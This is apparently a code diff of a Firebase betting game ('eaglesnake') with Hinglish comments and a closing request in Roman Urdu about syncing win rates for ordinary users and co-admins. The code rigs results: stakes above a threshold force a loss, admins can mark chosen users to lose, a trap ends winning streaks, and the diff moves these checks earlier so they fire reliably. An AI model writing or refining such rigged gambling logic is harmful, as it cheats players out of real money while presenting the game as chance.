@@ -120,22 +120,20 @@ onAuthStateChanged(auth,async user=>{
       let accuracy=null;
       let userCtrl=null;
       try{
-        // ✅ PREDICTOR SETTINGS (co-admin ke liye)
         const gsSnap=await getDoc(doc(db,"settings","dragonPredictor"));
         const gs=gsSnap.exists()?gsSnap.data():{};
         if(gs.accuracy!=null)accuracy=Number(gs.accuracy);
         const trapBet=Number(gs.trapBet||500);
         const trapWins=Number(gs.trapWins||5);
-
-        // Bet trap
         if(stake>=trapBet)forceLoss=true;
 
-        // ✅ TARGET CHECK (co-admin ke liye)
+        // ✅ FIX 1: TARGET CHECK — ab PEHLE (risky query se pehle), taake crash isko na roke
         const tSnap=await getDoc(doc(db,"settings","predictorTargets"));
         const targets=tSnap.exists()?tSnap.data():{};
         if(targets[user.uid]&&targets[user.uid].wrongUntil>0)forceLoss=true;
+        console.log("🎯 Target check:",targets[user.uid]||"none","→ forceLoss:",forceLoss);
 
-        // ✅ ADMIN-POWER CHECK (sab users ke liye)
+        // ✅ FIX 2: ADMIN-POWER CHECK — ye bhi pehle
         const ucSnap=await getDoc(doc(db,"settings","userWinControls"));
         if(ucSnap.exists()){
           const ucAll=ucSnap.data()||{};
@@ -143,7 +141,8 @@ onAuthStateChanged(auth,async user=>{
           if(userCtrl&&userCtrl.forceLoss===true)forceLoss=true;
         }
 
-        // ✅ CONSECUTIVE WINS TRAP (sab users ke liye)
+        // ✅ FIX 3: CONSECUTIVE WINS TRAP — orderBy hataya (composite index crash se bacha),
+        // manual sort + ALAG try/catch taake fail hone par bhi upar wale checks safe rahen
         if(!forceLoss){
           try{
             const rec=await getDocs(query(collection(db,"games"),where("uid","==",user.uid),where("game","==","eaglesnake"),limit(50)));
@@ -154,25 +153,17 @@ onAuthStateChanged(auth,async user=>{
         }
       }catch(e){console.error("Control check:",e);}
 
-      // ✅ WIN CHANCE DECISION (CRYSTAL CLEAR LOGIC):
+      // ✅ Priority order:
       // 1. forceLoss (targets/traps/admin-power) → hamesha loss
-      // 2. isCoAdmin user → admin-predictor.html se accuracy use karo
-      // 3. normal user → admin-eaglesnake.html se cfg.winChance use karo
-      // 4. admin-power override (userCtrl) → dono ke upar priority
+      // 2. userCtrl.winChance (admin-power) → custom %
+      // 3. co-admin accuracy (predictor) → global %
+      // 4. cfg.winChance (eaglesnake) → default
       let willWin;
-      if(forceLoss){
-        willWin=false;
-      }else if(userCtrl&&userCtrl.winChance!=null){
-        willWin=(rand100()<Number(userCtrl.winChance));
-      }else if(isCoAdmin&&accuracy!=null){
-        // ✅ CO-ADMIN: admin-predictor.html se synced
-        willWin=(rand100()<accuracy);
-        console.log("🎯 Co-admin win chance:",accuracy+"%");
-      }else{
-        // ✅ NORMAL USER: admin-eaglesnake.html se synced
-        willWin=rollWin(cfg.winChance);
-        console.log("🎮 Normal user win chance:",cfg.winChance+"%");
-      }
+      if(forceLoss) willWin=false;
+      else if(userCtrl&&userCtrl.winChance!=null) willWin=(rand100()<Number(userCtrl.winChance));
+      else if(isCoAdmin&&accuracy!=null) willWin=(rand100()<accuracy);
+      else willWin=rollWin(cfg.winChance);
+      console.log("🎲 willWin:",willWin,"(forceLoss:",forceLoss,")");
 
       let result;
       if(willWin){result=side;}
@@ -213,3 +204,6 @@ onAuthStateChanged(auth,async user=>{
   }catch(err){console.error(err);$("bal").textContent="—";}
 });
 </script></body></html>
+is file me koi changes nhi kerni
+bus serf itna kerna hai k normal user ko admin-eaglesnake.html wali win rate de or isCoAdmin wale user ko admin-predictor.html k sath sync ker way 
+is k ilawa no changes 
